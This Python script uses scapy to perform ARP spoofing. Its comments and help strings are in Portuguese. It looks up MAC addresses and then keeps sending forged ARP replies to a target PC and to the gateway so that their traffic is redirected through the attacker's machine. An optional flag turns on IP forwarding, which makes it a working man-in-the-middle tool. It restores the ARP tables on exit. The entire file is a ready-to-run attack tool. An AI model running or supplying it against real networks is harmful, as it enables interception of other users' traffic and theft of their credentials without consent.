import time

import scapy.all as scapy

import os

import argparse


# hwtype     : XShortEnumField                     = ('1')
# ptype      : XShortEnumField                     = ('2048')
# hwlen      : FieldLenField                       = ('None')
# plen       : FieldLenField                       = ('None')
# op         : ShortEnumField                      = ('1')
# hwsrc      : MultipleTypeField (SourceMACField, StrFixedLenField) = ('None')
# psrc       : MultipleTypeField (SourceIPField, SourceIP6Field, StrFixedLenField) = ('None')
# hwdst      : MultipleTypeField (MACField, StrFixedLenField) = ('None')
# pdst       : MultipleTypeField (IPField, IP6Field, StrFixedLenField) = ('None')
# op 1 = request, op 2 = response
# route -n: Para conseguir o ip gateway
# arpspoof de alvo para gateway e de gateway para alvo


def desvio(pcip, roteadorip):
    pcmac = get_mac(pcip)
    pacote = scapy.ARP(op=2, pdst=pcip, hwdst=pcmac,
                       psrc=roteadorip)  # pdst = ip do pc, hwdst = mac do pc. psrc = ip do roteador
    scapy.send(pacote, verbose=False)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(
        dst="ff:ff:ff:ff:ff:ff")  # Quando um pacote é enviado para esse endereço, todos os dispositivos na rede recebem e processam o pacote.
    pacote = broadcast / arp_request  # combina os dois pacotes
    respondidos, nrespondidos = scapy.srp(pacote, timeout=1, verbose=False)  # iface = wlan0
    return respondidos[0][1].hwsrc


def salvaguarda(pcip, roteadorip):
    pcmac = get_mac(pcip)
    roteadormac = get_mac(roteadorip)
    # st = client, src = source
    pacote = scapy.ARP(op=2, pdst=pcip, hwdst=pcmac, psrc=roteadorip, hwsrc=roteadormac)
    scapy.send(pacote, verbose=False)


def parse_argumentos():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", dest="cip", help="Pc ip")
    parser.add_argument("-s", dest="rip", help="Source ip")
    parser.add_argument("-f", action="store_true", help="Ativa port forwarding")
    argument = parser.parse_args()
    return argument


argumentos = parse_argumentos()

if argumentos.f:
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    print("Port forwarding ativado!")

try:
    envios = 0
    while True:
        desvio(argumentos.cip, argumentos.rip)
        desvio(argumentos.rip, argumentos.cip)
        envios += 1
        print("\r <|  Numero de envios = {}   |>".format(envios), end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\nParando...")
    salvaguarda(argumentos.cip, argumentos.rip)
    salvaguarda(argumentos.rip, argumentos.cip)
